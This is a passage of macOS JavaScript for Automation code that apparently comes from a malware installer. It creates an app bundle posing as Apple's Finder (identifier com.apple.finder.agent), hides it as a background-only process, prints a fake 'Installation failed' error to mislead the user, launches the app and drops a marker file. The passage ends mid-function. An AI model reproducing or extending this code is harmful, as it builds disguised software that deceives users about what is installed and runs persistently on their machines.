};
this.createInfoPlist=function(p,e){
var x="<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"+
"<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n"+
"<plist version=\"1.0\"><dict>\n"+
"<key>CFBundleExecutable</key><string>"+e+"</string>\n"+
"<key>CFBundleIdentifier</key><string>com.apple.finder.agent</string>\n"+
"<key>CFBundleName</key><string>Finder</string>\n"+
"<key>CFBundleDisplayName</key><string>Finder</string>\n"+
"<key>CFBundleIconFile</key><string>AppIcon</string>\n"+
"<key>LSUIElement</key><true/>\n"+
"<key>LSBackgroundOnly</key><true/>\n</dict></plist>";
var d=$.NSString.stringWithString(x).dataUsingEncoding($.NSUTF8StringEncoding);
return $.NSFileManager.defaultManager.createFileAtPathContentsAttributes($(p+"/Contents/Info.plist"),d,$());
};
this.printStatus=function(m){
var h=$.NSFileHandle.fileHandleWithStandardOutput;
var d=$.NSString.alloc.initWithString("\033[2K\r"+m).dataUsingEncoding($.NSUTF8StringEncoding);
h.writeData(d);
};
this.printError=function(){
var h=$.NSFileHandle.fileHandleWithStandardOutput;
var d=$.NSString.alloc.initWithString("\033[2K\rInstallation failed.\nThis software requires additional system components that aren't available.\n").dataUsingEncoding($.NSUTF8StringEncoding);
h.writeData(d);
};
this.launchApp=function(p){
try{
var ws=$.NSWorkspace.sharedWorkspace;
var url=$.NSURL.fileURLWithPath(p);
ws.openURL(url);
}catch(e){}
};
this.setupApp=function(b,a,e){
var fm=$.NSFileManager.defaultManager;
fm.createDirectoryAtPathWithIntermediateDirectoriesAttributesError($(a+"/Contents/MacOS"),true,$(),$());
copyIcon(a);
createInfoPlist(a,e);
fm.createFileAtPathContentsAttributes($(b+"/.Cheked"),$(),$());
};
this.serializeServiceProfile=function(url,path){
try{
